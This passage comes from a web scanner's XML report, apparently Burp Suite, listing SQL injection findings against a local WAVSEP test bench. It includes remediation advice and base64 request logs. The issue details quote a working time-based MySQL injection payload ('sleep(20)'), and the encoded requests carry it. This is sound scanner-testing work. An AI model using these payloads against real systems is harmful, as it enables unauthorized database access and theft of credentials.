GU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gSW50ZXJuYWwgU2VydmVyIEVycm9yPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDItQ29uZGl0aW9uYWxFcnJvci1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULUJsaW5kL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIHRvIHRyaWdnZXIgZXJyb25lb3VzIHJlc3BvbnNlcyB0byBpbmZlciBpbmZvcm1hdGlvbi4gR29hbDogcmV0cmlldmUgJ2FkbWluJyBwYXNzd29yZCBpbmplY3RpbmcgaW4gR0VUIHBhcmFtZXRlci48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDItQ29uZGl0aW9uYWxFcnJvci1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIHRvIHRyaWdnZXIgZXJyb25lb3VzIHJlc3BvbnNlcyB0byBpbmZlciBpbmZvcm1hdGlvbi4gR29hbDogcmV0cmlldmUgJ2FkbWluJyBwYXNzd29yZCBpbmplY3RpbmcgaW4gR0VUIHBhcmFtZXRlci48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7038987170819665920</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-Blind/Case03-TimeDelay-RetrieveAdminPassword-BlindExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-Blind/Case03-TimeDelay-RetrieveAdminPassword-BlindExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDMtVGltZURlbGF5LVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDcxMg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1MDo1OSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gSW50ZXJuYWwgU2VydmVyIEVycm9yPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDMtVGltZURlbGF5LVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtQmxpbmQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIHRvIHRyaWdnZXIgY29uZGl0aW9uYWwgdGltZSBkZWxheXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDMtVGltZURlbGF5LVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULUJsaW5kL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIHRvIHRyaWdnZXIgY29uZGl0aW9uYWwgdGltZSBkZWxheXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8603991753777499136</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-Blind/Case02-ConditionalError-RetrieveAdminPassword-BlindExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-Blind/Case02-ConditionalError-RetrieveAdminPassword-BlindExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
